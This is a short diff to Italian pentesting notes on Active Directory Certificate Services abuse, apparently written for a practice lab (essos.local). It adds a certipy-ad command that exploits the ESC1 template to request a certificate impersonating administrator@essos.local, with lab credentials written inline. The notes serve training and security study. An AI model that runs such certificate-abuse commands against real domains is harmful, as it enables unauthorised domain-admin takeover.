@@ -218,7 +218,10 @@ certipy-ad find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 192.168.
 *BloodHound*
 Carica il file zip e  vai in PKI -> Find certificate authority -> see enabled template
 ### **ESC 1 - ADCS**
-
+Richiedi il certificato tramite certipy
+```bash
+certipy-ad req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
+```
 ### **ESC 2 & 3 - ADCS**
 ### **ESC 4 - ADCS**
 ### **ESC 6 - ADCS**
